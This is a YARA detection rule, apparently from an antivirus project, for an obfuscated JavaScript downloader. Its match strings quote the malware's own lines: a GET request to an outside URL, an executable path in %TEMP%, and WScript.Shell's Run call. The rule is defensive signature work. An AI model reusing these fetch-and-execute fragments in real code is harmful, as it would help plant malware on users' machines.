rule sig_20160328_1e345c82a86eaacb2218d5dca8634707 {
  meta:
    description = "datamaliciousorder - file 20160328_1e345c82a86eaacb2218d5dca8634707.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "20fdaba54533eff3e769793ddbd5775c20dba56b2955e33dcb4c0d4d87679849"

  strings:
    $s1  = "function Urgugnxp() {return Bonymbpasz[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"fZ3TZV6xpycLzPG.exe\";};" fullword ascii
    $s2  = "Rqmluakc[Zcebnko](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Bhasqfm](Oxdihzkmxz() * 11)} while (Rqmluakc[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Bonymbpasz = function Djxmtlzfzj() {return WScript[Lonwvokxb](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Jkvdpnaknk(Bcydx, Nnhxr){return Bcydx - Nnhxr;};" fullword ascii
    $s6  = "function Fcewcszjon() {return ((Qxspdpdlc == true) && (Qxspdpdlc == Ghatfzbq)) ? 1 : Fddpsog;};" fullword ascii
    $s7  = "function Zbdvqaj(Twvimgyjuz){Bonymbpasz[\"Run\"](Twvimgyjuz, Fddpsog, Fddpsog);};" fullword ascii
    $s8  = "var Rmifao = false;" fullword ascii
    $s9  = "return Jkvdpnaknk(Xwkfuz, Ymovc);" fullword ascii
    $s10 = "function Uhqciun(){return Lonwvokxb;};" fullword ascii
    $s11 = "function Oxdihzkmxz(){return 22;};" fullword ascii
    $s12 = "var Qxspdpdlc = false;" fullword ascii
    $s13 = "function Dlsuivjus(Odafnrn) {var Rybcop = (1, 2, 3, 4, 5, Odafnrn); return Rybcop;};" fullword ascii
    $s14 = "function Oyvsathvg(){return Ebbdmdaet;};" fullword ascii
    $s15 = "var Vtdayvzbqj = new this[\"Date\"]();" fullword ascii
    $s16 = " while (Suokpnpz){" fullword ascii
    $s17 = "function Zdikfozjei()" fullword ascii
    $s18 = "var Ghatfzbq = false;" fullword ascii
    $s19 = "Ghatfzbq = true; " fullword ascii
    $s20 = "Qxspdpdlc = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}